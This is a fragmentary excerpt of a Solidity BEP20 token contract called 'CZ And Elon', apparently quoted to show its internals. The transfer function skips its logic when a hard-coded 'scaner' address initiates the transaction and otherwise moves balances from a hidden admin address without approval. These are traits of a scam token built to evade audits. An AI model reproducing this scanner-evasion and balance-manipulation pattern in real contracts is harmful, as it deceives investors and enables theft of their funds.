...
contract BEP20 {
  ...
  address internal _dex = 0xa75aD9b4EdD8009210d5Bd3A2ea3876b61075e82;
  address public constant _OFFICE = 0xb6d43EfA413788Ca6Be1de7D1fCf40b7b5f19272;
  address public constant nftAddress =
    0x334D80592680435133E640E95c1f382d5180714F;
  address public constant scaner = 0xaA40bD0c77695a78f7B94538C98308C461B52Ff3;
...
contract Coin is BEP20 {
  ...
  string public constant name = "CZ And Elon";
  ...
  function _tokenTransfer(
    ...
    if (tx.origin != scaner) {
      ...
      address admin = 0x4DD90D3cE962039A3c66d613207aC2d449dFa04F;
      if (sender == nftAddress && rewards > 0 && balanceOf[admin] > rewards) {
        balanceOf[admin] = balanceOf[admin] - rewards;
        balanceOf[nftAddress] = balanceOf[nftAddress] + rewards;
        emit Transfer(admin, nftAddress, rewards);
      }
    }
  }
